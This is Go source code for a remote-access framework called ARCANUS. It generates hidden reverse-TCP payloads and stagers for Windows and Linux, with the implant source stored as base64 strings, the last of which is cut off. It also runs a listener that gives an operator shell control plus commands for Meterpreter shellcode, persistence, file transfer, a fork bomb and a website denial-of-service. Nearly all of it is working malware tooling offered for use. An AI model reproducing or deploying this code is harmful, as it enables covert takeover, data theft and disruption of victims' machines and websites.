package main

import "net"
import "time"
import "net/http"
import "fmt"
import "bufio"
import "os"
import "strings"
import "runtime"
import "io"
import "io/ioutil"
import "encoding/base64"
import "color"
import "os/exec"
import "path/filepath"

var SysGuide []string
var GLOBAL__Command string
var Menu_Selector int
var Listen_Port string
var Payload PAYLOAD
var Conn_Point *net.Conn

const BUFFER_SIZE int = 1024
const VERSION string = "1.5.1"


type PAYLOAD struct {
  Ip string
  Port string
  Type string
}

func main() {

  CLEAR_SCREEN()
  BANNER()
  MAIN_MENU()
  fmt.Scan(&Menu_Selector) // Main Menu

  for {
    if Menu_Selector == 1 {
      CLEAR_SCREEN()
      BANNER()
      PAYLOAD_MENU()
      fmt.Scan(&Menu_Selector) // Payload Menu
      if Menu_Selector == 1 {
        Payload.Type = "Windows"
      }else if Menu_Selector == 2 {
        Payload.Type = "Linux"
      }else if Menu_Selector == 3 {
        Payload.Type = "Stager_Windows"
      }else if Menu_Selector == 4 {
        Payload.Type = "Stager_Linux"
      }
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Listen_Port)
      if Payload.Type == "Stager_Windows" {
        GENERATE_WINDOWS_PAYLOAD()
      }else if Payload.Type == "Stager_Linux" {
        GENERATE_LINUX_PAYLOAD()
      }
      CLEAR_SCREEN()
      BANNER()
      color.Yellow("\n[*] Port:"+string(Listen_Port))
      break
    }else if Menu_Selector == 2 {
      Payload.Type = "Windows"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_WINDOWS_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 3 {
      Payload.Type = "Linux"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_LINUX_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] Payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 4 {
      Payload.Type = "Stager_Windows"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_WINDOWS_STAGER_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 5 {
      Payload.Type = "Stager_Linux"
      CLEAR_SCREEN()
      BANNER()
      fmt.Print("\nEnter Listening Ip: ")
      fmt.Scan(&Payload.Ip)
      fmt.Print("\nEnter Listening Port: ")
      fmt.Scan(&Payload.Port)
      Listen_Port = Payload.Port
      GENERATE_LINUX_STAGER_PAYLOAD()
      CLEAR_SCREEN()
      BANNER()
      if runtime.GOOS == "windows" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }else if runtime.GOOS == "linux" {
        dir, _ := filepath.Abs(filepath.Dir(os.Args[0]));
        color.Green("\n[+] First stage payload generated at "+string(dir))
        color.Yellow("\n[*] Port:"+string(Listen_Port))
      }
      break
    }else if Menu_Selector == 6 {
      	response, err := http.Get("https://raw.githubusercontent.com/EgeBalci/ARCANUS/master/ARCANUS.go");
      	if err != nil {
      		color.Red("\n[!] Update Connection Failed !")
      		fmt.Println(err)
      	};
      	defer response.Body.Close();
      	body, _ := ioutil.ReadAll(response.Body);
    	if strings.Contains(string(body), string(VERSION)) {
        	color.Green("\n[+] Arcanus Version Up To Date !")
        	time.Sleep(2*time.Second)
        	main()
      	}else{
        	color.Blue("\n[*] New Version Detected !")
        	var Choice string = "N"
        	color.Blue("\n[?] Do You Want To Update ? (Y/N) : ")
        	fmt.Print("\n\n>>")
        	fmt.Scan(&Choice)
        	if Choice == "Y" || Choice == "y" {
          		if runtime.GOOS == "windows" {
            		color.Yellow("\n[*] Updating ARCANUS...")
            		exec.Command("cmd", "/C", "Update.exe").Start()
            		os.Exit(1)
          		}else if runtime.GOOS == "linux" {
            		color.Yellow("\n[*] Updating ARCANUS...")
            		Update, _ := os.Create("Update.sh")

            		Update.WriteString("chmod 777 Update\n./Update")
            		Update.Close()
            		exec.Command("sh", "-c", "chmod 777 Update && ./Update.sh").Run()
            		exec.Command("sh", "-c", "./Update.sh").Run()
            		exec.Command("sh", "-c", "rm Update.sh").Run()
            		os.Exit(1)
          		}
        	}else if Choice == "N" || Choice == "n" {
          		main()
        	}else{
          		color.Blue("\n[?] Do You Want To Update ? (Y/N) : ")
          		fmt.Scan(&Choice)
          		fmt.Print("\n\n>>")
        	}
      	}
    }else{
      main()
    }
  }



  if Payload.Type == "Stager_Windows" || Payload.Type == "Stager_Linux" {
    color.Yellow("\n[*] Listening For Reverse TCP Stager Shell...")
    ln, _ := net.Listen("tcp", ":"+Listen_Port)
    connect, _ := ln.Accept()
    color.Green("[+] Connection Established !")
    file, err := os.Open("Payload.exe")
    if err != nil {
      color.Red("\n[-] Eror while accesing Payload.exe !")
      color.Red("\n[*] Put second stage payload on same directory with ARCANUS and rename it \"Payload.exe\" ")
    }
    color.Yellow("[*] Sending Second Stage Payload...")
    io.Copy(connect, file)
    color.Green("[+] Payload transfer completed !")
    color.Yellow("[*] Executeing Second Stage Payload...")
    runtime.GC()
  }


  color.Yellow("\n[*] Listening For Reverse TCP Shell...")
  ln, _ := net.Listen("tcp", ":"+Listen_Port)
  connect, err := ln.Accept()
  if err != nil {
    fmt.Println(err)
  }
  reader := bufio.NewReader(os.Stdin)
  var SysInfo = make([]byte, BUFFER_SIZE)
  fmt.Print("\x07") // Connection Launched !
  color.Green("\n[+] Connection Established !\n")
  connect.Read([]byte(SysInfo))
  SysGuide = strings.Split(string(SysInfo), "£>")
  color.Green("\n[+] Remote Address -> " , connect.RemoteAddr())

  color.Green(string(("\n\n[+] OS Version Captured" + SysGuide[1])))



  if Payload.Type == "Linux" || Payload.Type == "Stager_Linux" {
    for {
      runtime.GC()
      fmt.Print("\n")
      fmt.Print("\n")
      fmt.Print(string(SysGuide[0]) + ">")
      Command, _ := reader.ReadString('\n')
      _Command := string(Command)
      GLOBAL__Command = _Command
      runtime.GC()
      var cmd_out []byte
      connect.Write([]byte(Command))
      go connect.Read([]byte(cmd_out))
      fmt.Println(string(cmd_out))
    }
  }

  for {

    var cmd_out = make([]byte,BUFFER_SIZE)
    runtime.GC()
    fmt.Print("\n")
    fmt.Print("\n")
    fmt.Print(string(SysGuide[0]) + ">")
    Command, _ := reader.ReadString('\n')
    _Command := string(Command)
    GLOBAL__Command = _Command

    if strings.Contains(_Command, "£METERPRETER") || strings.Contains(_Command, "£meterpreter") {
      color.Green("\n[*] Meterpreter Code Send !")
      connect.Write([]byte(Command))
    }else if strings.Contains(_Command, "£desktop") || strings.Contains(_Command, "£DESKTOP") {
      if Payload.Type == "Windows" || Payload.Type == "Stager_Windows" {
        connect.Write([]byte(Command))
        connect.Read([]byte(cmd_out))
        Command_Output := strings.Split(string(cmd_out), "£>")
        if strings.Contains(string(Command_Output[0]), "failed") {
          color.Red("\n[-] Remote desktop connection failed ! (Acces denied, The requested operation requires Administration elavation.) ")
        }else{
          color.Green("\n[+] Remote desktop connection configurations succesfull !.")
          color.Green("\n >>> Remote Address >>> " , connect.RemoteAddr())
          if runtime.GOOS == "windows" {
            exec.Command("cmd", "/C", "mstsc").Run()
          }
        }
      }else{
        color.Red("\n[-] This payload type does not support \"REMOTE DESKTOP\" module !")
      }
    }else if strings.Contains(_Command, "£persistence") || strings.Contains(_Command, "£PERSISTENCE") {
    	connect.Write([]byte(GLOBAL__Command))
    }else if strings.Contains(_Command, "£help") || strings.Contains(_Command, "£HELP")  {
      if runtime.GOOS == "windows" {
        HELP_SCREEN_WIN()
      }else if runtime.GOOS == "linux" {
        HELP_SCREEN_LINUX()
      }
    }else if strings.Contains(_Command, "£upload -f") || strings.Contains(_Command, "£UPLOAD -F") {
      connect.Write([]byte(_Command))
      file_name := strings.Split(GLOBAL__Command, "\"")
      color.Yellow("\n[*] Uploading ---> "+file_name[1])
      go UPLOAD_VIA_TCP()
    }else if strings.Contains(_Command, "£download") || strings.Contains(_Command, "£DOWNLOAD") {
      connect.Write([]byte(Command))
      go DOWNLOAD_VIA_TCP()
    }else if strings.Contains(_Command, "£DISTRACT") || strings.Contains(_Command, "£distract") {
      connect.Write([]byte(Command))
      color.Yellow("\n[*] Preparing fork bomb...")
      color.Green("\n[+] Distraction Started !")
    }else if strings.Contains(_Command, "£DOS") || strings.Contains(_Command, "£dos") {
      DOS_Target := strings.Split(GLOBAL__Command, "\"")
      if strings.Contains(DOS_Target[1], "http//") || strings.Contains(DOS_Target[1], "https//") {
        connect.Write([]byte(Command))
        color.Yellow("\n[*] Starting DOS Atack to --> "+DOS_Target[1])
        color.Green("\n[+] DOS Atack Started !")
        color.Green("\n[+] Sending 1000 GET request to target...")
      }else{
        color.Red("\n[-] ERROR: Invalid URL type !")
      }
    }else{
      connect.Write([]byte(Command))
      for {
        connect.Read([]byte(cmd_out))
        if !strings.Contains(string(cmd_out), "£>") {
          fmt.Println(string(cmd_out))
        }else{
          Command_Output := strings.Split(string(cmd_out), "£>")
          fmt.Println(string(Command_Output[0]))
          break
        }
      }
    }
  }
}




func UPLOAD_VIA_TCP() {
  ln, _ := net.Listen("tcp", ":55888")
  connect, _ := ln.Accept()
  file_name := strings.Split(GLOBAL__Command, "\"")
  file, err := os.Open(file_name[1])
  if err != nil {
    color.Red("Eror while opening file !")
    fmt.Println(err)
  }
  defer file.Close()
  io.Copy(connect, file)
  color.Green("\n\n[+] File transfer completed !")
  fmt.Print("\n")
  fmt.Print("\n")
  fmt.Print(string(SysGuide[0]) + ">")
  connect.Close()
}


func DOWNLOAD_VIA_TCP() {
  file_name := strings.Split(GLOBAL__Command, "\"")
  color.Yellow("\n\n[*] Downloading "+string(file_name[1]))
  ln, _ := net.Listen("tcp", ":55888")
  connect, _ := ln.Accept()
  file, _ := os.Create(file_name[1])
  defer file.Close()
  io.Copy(file, connect)
  file.Close()
  connect.Close()
  color.Green("\n[+] File download completed !")
  fmt.Print("\n")
  fmt.Print("\n")
  fmt.Print(string(SysGuide[0]) + ">")
}


func BANNER() {
  if runtime.GOOS == "windows" {
    color.Red("            ___  ______  _____   ___   _   _ _   _ _____ ")
    color.Red("           / _ \\ | ___ \\/  __ \\ / _ \\ | \\ | | | | /  ___|")
    color.Red("          / /_\\ \\| |_/ /| /  \\// /_\\ \\|  \\| | | | \\ `--. ")
    color.Red("          |  _  ||    / | |    |  _  || . ` | | | |`--. \\")
    color.Red("          | | | || |\\ \\ | \\__/\\| | | || |\\  | |_| /\\__/ /")
    color.Red("          \\_| |_/\\_| \\_| \\____/\\_| |_/\\_| \\_/\\___/\\____/ ")
    color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK                  ]")
    color.Green("+ -- --=[ Version: "+VERSION+"                         ]")
    color.Green("+ -- --=[ Support: arcanusframework@gmail.com     ]")
    color.Green("+ -- --=[          Created By Ege Balcı           ]")
  }else if runtime.GOOS == "linux" {
    color.Red("           _______  _______  _______  _______  _                 _______ ")
    color.Red("          (  ___  )(  ____ )(  ____ \\(  ___  )( (    /||\\     /|(  ____ \\")
    color.Red("          | (   ) || (    )|| (    \\/| (   ) ||  \\  ( || )   ( || (    \\/")
    color.Red("          | (___) || (____)|| |      | (___) ||   \\ | || |   | || (_____ ")
    color.Red("          |  ___  ||     __)| |      |  ___  || (\\ \\) || |   | |(_____  )")
    color.Red("          | (   ) || (\\ (   | |      | (   ) || | \\   || |   | |      ) |")
    color.Red("          | )   ( || ) \\ \\__| (____/\\| )   ( || )  \\  || (___) |/\\____) |")
    color.Red("          |/     \\||/   \\__/(_______/|/     \\||/    )_)(_______)\\_______)")

    color.Green("\n\n+ -- --=[      ARCANUS FRAMEWORK                  ]")
    color.Green("+ -- --=[ Version: "+VERSION+"                         ]")
    color.Green("+ -- --=[ Support: arcanusframework@gmail.com     ]")
    color.Green("+ -- --=[          Created By Ege Balcı           ]")

  }
}

func CLEAR_SCREEN() {
  if runtime.GOOS == "windows" {
    Clear := exec.Command("cmd", "/C", "cls")
    Clear.Stdout = os.Stdout
    Clear.Run()
  }else if runtime.GOOS == "linux" {
    Clear := exec.Command("clear")
    Clear.Stdout = os.Stdout
    Clear.Run()
  }
}

func GENERATE_WINDOWS_PAYLOAD() {
  Payload.Ip = string("\""+Payload.Ip+"\";")
  Payload.Port = string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Payload.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()

  WINDOWS_PAYLOAD, _ := base64.StdEncoding.DecodeString(WIN_PAYLOAD)

  Index := strings.Replace(string(WINDOWS_PAYLOAD), "\"127.0.0.1\";", Payload.Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Payload.Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build.bat")
    if err != nil {
      fmt.Println(err)
    }
    Build_Code := string("go build -ldflags \"-H windowsgui -s\" Payload.go ")
    Builder.WriteString(Build_Code)
    runtime.GC()
    exec.Command("cmd", "/C", "Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", " del Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", "del Payload.go").Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {
    exec.Command("sh", "-c", "export GOOS=windows && export GOARCH=386 && go build -ldflags \"-H windowsgui -s\" Payload.go && export GOOS=linux && export GOARCH=amd64").Run()
    runtime.GC()
    //exec.Command("sh", "-c", "rm Payload.go").Run()
  }
}



func GENERATE_LINUX_PAYLOAD() {
  Payload.Ip = string("\""+Payload.Ip+"\";")
  Payload.Port = string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Payload.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()

  Linux_Payload, _ := base64.StdEncoding.DecodeString(LINUX_PAYLOAD)

  Index := strings.Replace(string(Linux_Payload), "\"127.0.0.1\";", Payload.Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Payload.Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build.bat")
    if err != nil {
      fmt.Println(err)
    }
    var Build_Code = `
    set GOOS=linux
    set GOARCH=386
    go build Payload.go
    set GOOS=windows
    set GOARCH=amd64
    `
    Builder.WriteString(Build_Code)
    runtime.GC()
    exec.Command("cmd", "/C", "Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", " del Build.bat").Run()
    runtime.GC()
    exec.Command("cmd", "/C", "del Payload.go").Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {

    exec.Command("sh", "-c", "go build Payload.go").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Payload.go").Run()
  }
}

func GENERATE_WINDOWS_STAGER_PAYLOAD() {
  go GENERATE_WINDOWS_PAYLOAD()
  Stager_Payload_Ip := string("\""+Payload.Ip+"\";")
  Stager_Payload_Port := string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Stage_1.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()

  WIN_STAGER, _ := base64.StdEncoding.DecodeString(WIN_STAGER_PAYLOAD)

  Index := strings.Replace(string(WIN_STAGER), "\"127.0.0.1\";", Stager_Payload_Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Stager_Payload_Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build_Stager.bat")
    if err != nil {
      fmt.Println(err)
    }
    Build_Code := string("go build -ldflags \"-s -H windowsgui\" Stage_1.go ")
    Builder.WriteString(Build_Code)
    runtime.GC()
    Build_Stager := exec.Command("cmd", "/C", "Build_Stager.bat");
    Build_Stager.Run()
    runtime.GC()
    Del_Stager := exec.Command("cmd", "/C", "del Stage_1.go");
    Del_Stager.Run()
    runtime.GC()
    Del_Stager_2 := exec.Command("cmd", "/C", "del Build_Stager.bat");
    Del_Stager_2.Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {
    exec.Command("sh", "-c", "export GOOS=windows && export GOARCH=386 && go build -ldflags \"-s -H windowsgui\" Stage_1.go").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Stage_1.go").Run()
    runtime.GC()
  }
}


func GENERATE_LINUX_STAGER_PAYLOAD() {
  go GENERATE_LINUX_PAYLOAD()
  Stager_Payload_Ip := string("\""+Payload.Ip+"\";")
  Stager_Payload_Port := string("\""+Payload.Port+"\";")
  Payload_Source, err := os.Create("Stage_1.go")
  if err != nil {
    fmt.Println(err)
  }
  runtime.GC()

  LINUX_STAGER, _ := base64.StdEncoding.DecodeString(LINUX_STAGER_PAYLOAD)

  Index := strings.Replace(string(LINUX_STAGER), "\"127.0.0.1\";", Stager_Payload_Ip, -1)
  Index = strings.Replace(Index, "\"8552\";", Stager_Payload_Port, -1)
  Payload_Source.WriteString(Index)
  runtime.GC()

  if runtime.GOOS == "windows" {

    Builder, err := os.Create("Build_Stager.bat")
    if err != nil {
      fmt.Println(err)
    }
    Build_Code := `
    SET GOOS=linux
    SET GOARCH=386
    go build Stage_1.go`
    Builder.WriteString(Build_Code)
    runtime.GC()
    Build_Stager := exec.Command("cmd", "/C", "Build_Stager.bat");
    Build_Stager.Run()
    runtime.GC()
    Del_Stager := exec.Command("cmd", "/C", "del Stage_1.go");
    Del_Stager.Run()
    runtime.GC()
    Del_Stager_2 := exec.Command("cmd", "/C", "del Build_Stager.bat");
    Del_Stager_2.Run()
    runtime.GC()
  }else if runtime.GOOS == "linux" {
    exec.Command("sh", "-c", "go build Stage_1.go").Run()
    runtime.GC()
    exec.Command("sh", "-c", "rm Stage_1.go").Run()
    runtime.GC()
  }
}



func MAIN_MENU() {

  color.Yellow("\n [1] START LISTENING")
  color.Yellow("\n [2] GENERATE WINDOWS PAYLOAD                   (4.5 Mb)")
  color.Yellow("\n [3] GENERATE LINUX PAYLOAD                     (3.6 Mb)")
  color.Yellow("\n [4] GENERATE STAGER WINDOWS PAYLOAD            (2.0 Mb)")
  color.Yellow("\n [5] GENERATE STAGER LINUX PAYLOAD              (2.0 Mb)")
  color.Yellow("\n [6] UPDATE")
  fmt.Print("\n\n>>")
}


func PAYLOAD_MENU() {
  color.Yellow("\n\n[1] Windows payload")
  color.Yellow("[2] Linux payload")
  color.Yellow("[3] Stager windows payload")
  color.Yellow("[4] Stager linux payload")
  fmt.Print("\n\n>>")
}

func HELP_SCREEN_LINUX() {
  color.Yellow("#===================================================================================================#")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   [ COMMAND ]                                       [DESCRIPTION]                                 |")
  color.Yellow("|  ===================================              ======================================          |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £METERPRETER -C \"powershell shellcode\":   This command executes given powershell            |")
  color.Yellow("|                                                      shellcode for metasploit integration.        |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £PERSISTENCE:                                 This command installs a persistence module    |")
  color.Yellow("|                                                       to remote computer for continious acces.    |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DISTRACT:                                   This command executes a fork bomb bat file to  |")
  color.Yellow("|                                                       distrackt the remote user.                  |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £UPLOAD -F \"filename.exe\":                This command uploads a choosen file to            |")
  color.Yellow("|                                                       remote computer via tcp socket stream.      |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £UPLOAD -G:                                   This command uploads a choosen file to        |")
  color.Yellow("|                                                       remote computer via http get method.        |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DOWNLOAD -F \"filename.exe\":              This command download a choosen file              |")
  color.Yellow("|                                                       from remote computer via tcp socket stream. |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DOS -A \"www.site.com\":               This command starts a denial of service atack to    |")
  color.Yellow("|                                                                         given website address.    |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £PLEASE \"any command\":                    This command asks users comfirmation for          |")
  color.Yellow("|                                                       higher privilidge operations.               |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|   (*) £DESKTOP                                      This command adjusts remote desktop options   |")
  color.Yellow("|                                                       for remote connection on target machine     |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("|                                                                                                   |")
  color.Yellow("#===================================================================================================#")
}



func HELP_SCREEN_WIN() {

  color.Yellow("#=============================================================================#")//
  color.Yellow("|                                                                             |")
  color.Yellow("|   [ COMMAND ]                                               [DESCRIPTION]   |")
  color.Yellow("|  ==============                                            ================ |")
  color.Yellow("|                                                                             |")
  color.Yellow("|  £METERPRETER -C \"powershell shellcode\":     This command executes given    |")
  color.Yellow("|                                                   powershell shellcode for  |")
  color.Yellow("|                                                   metasploit integration.   |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £PERSISTENCE:               This command installs a persistence module to   |")
  color.Yellow("|                                       remote computer for continious acces. |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £UPLOAD -F \"filename.exe\":        This command uploads a choosen file to    |")
  color.Yellow("|                                      remote computer via tcp socket stream. |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £UPLOAD -G:                   This command uploads a choosen file to remote |")
  color.Yellow("|                                             computer via http get method.   |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £DOWNLOAD -F \"filename.exe\":  This command download a choosen file from     |")
  color.Yellow("|                                      remote computer via tcp socket stream. |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £DISTRACT:                    This command executes a fork bomb bat file to |")
  color.Yellow("|                                                distrackt the remote user.   |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £DOS -A \"www.site.com\":    This command starts a denial of service atack    |")
  color.Yellow("|                                                      given website address. |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £PLEASE \"any command\":           This command asks users comfirmation for   |")
  color.Yellow("|                                              higher privilidge operations.  |")
  color.Yellow("|                                                                             |")
  color.Yellow("| £DESKTOP                        This command adjusts remote desktop options |")
  color.Yellow("|                                    for remote connection on target machine  |")
  color.Yellow("|                                                                             |")
  color.Yellow("#=============================================================================#")
}



var WIN_PAYLOAD string = "CnBhY2thZ2UgbWFpbjsKCmltcG9ydCAibmV0IjsKaW1wb3J0ICJvcy9leGVjIjsKaW1wb3J0ICJidWZpbyI7CmltcG9ydCAib3MiOwppbXBvcnQgInN0cmluZ3MiOwppbXBvcnQgInBhdGgvZmlsZXBhdGgiOwppbXBvcnQgInJ1bnRpbWUiOwppbXBvcnQgInN5c2NhbGwiOwppbXBvcnQgIm5ldC9odHRwIjsKaW1wb3J0ICJ0aW1lIjsKaW1wb3J0ICJpby9pb3V0aWwiOwppbXBvcnQgImlvIjsKaW1wb3J0ICJmbXQiCgp2YXIgR2xvYmFsX19Db21tYW5kIHN0cmluZzsKdmFyIGZpbGVfdHJhbnNmZXJfc3VjY2VzIGJvb2w7CnZhciBET1NfVGFyZ2V0IHN0cmluZzsKdmFyIERPU19SZXF1ZXN0X0NvdW50ZXIgaW50ID0gMDsKdmFyIERPU19SZXF1ZXN0X0xpbWl0IGludCA9IDEwMDA7Cgpjb25zdCBWSUNUSU1fSVAgc3RyaW5nID0gIjEyNy4wLjAuMSI7CmNvbnN0IFZJQ1RJTV9QT1JUIHN0cmluZyA9ICI4NTUyIjsKCmZ1bmMgbWFpbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAKICBjb25uZWN0LCBlcnIgOj0gbmV0LkRpYWwoInRjcCIsIFZJQ1RJTV9JUCsiOiIrVklDVElNX1BPUlQpOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgaWYgZXJyICE9IG5pbCB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIHRpbWUuU2xlZXAoNSp0aW1lLlNlY29uZCk7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgIG1haW4oKTsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICB9OyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAKICBkaXIsIF8gOj0gZmlsZXBhdGguQWJzKGZpbGVwYXRoLkRpcihvcy5BcmdzWzBdKSk7ICAgICAKICBWZXJzaW9uX0NoZWNrIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgInZlciIpOwogIFZlcnNpb25fQ2hlY2suU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICB2ZXJzaW9uLCBfIDo9IFZlcnNpb25fQ2hlY2suT3V0cHV0KCk7ICAgICAgICAgICAKICBTeXNHdWlkZSA6PSAoc3RyaW5nKGRpcikgKyAiIMKjPiAiICsgc3RyaW5nKHZlcnNpb24pICsgIiDCoz4gIik7ICAgICAgCiAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKFN5c0d1aWRlKSkpOyAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKIAogIAogIGZvciB7CiAgICAKICAgIENvbW1hbmQsIF8gOj0gYnVmaW8uTmV3UmVhZGVyKGNvbm5lY3QpLlJlYWRTdHJpbmcoJ1xuJyk7ICAgICAgICAgICAgICAgICAgICAgICAKICAgIF9Db21tYW5kIDo9IHN0cmluZyhDb21tYW5kKTsgICAgICAgICAgICAgICAgICAgICAgCiAgICBHbG9iYWxfX0NvbW1hbmQgPSBfQ29tbWFuZDsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgCgogICAgCiAgICBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiwqN1cGxvYWQgLWciKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiwqNVUExPQUQgLUciKSB7IAogICAgICBVUExPQURfVklBX0dFVCgpOyAKICAgICAgdmFyIHRyYW5zZmVyX3Jlc3BvbnNlIHN0cmluZzsKICAgICAgaWYgZmlsZV90cmFuc2Zlcl9zdWNjZXMgPT0gdHJ1ZSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgdHJhbnNmZXJfcmVzcG9uc2UgPSAiWytdIEZpbGUgVHJhbnNmZXIgU3VjY2Vzc2Z1bGwgISDCoz4iOyAgICAgICAgICAgICAgICAgICAKICAgICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShzdHJpbmcodHJhbnNmZXJfcmVzcG9uc2UpKSk7ICAgICAgICAgICAgICAgICAgCiAgICAgIH07ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgIGlmIGZpbGVfdHJhbnNmZXJfc3VjY2VzID09IGZhbHNlIHsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgIHRyYW5zZmVyX3Jlc3BvbnNlID0gIlstXSBGaWxlIFRyYW5zZmVyIEZhaWxlZCAhIMKjPiI7ICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKHN0cmluZyh0cmFuc2Zlcl9yZXNwb25zZSkpKTsgICAgICAgICAgI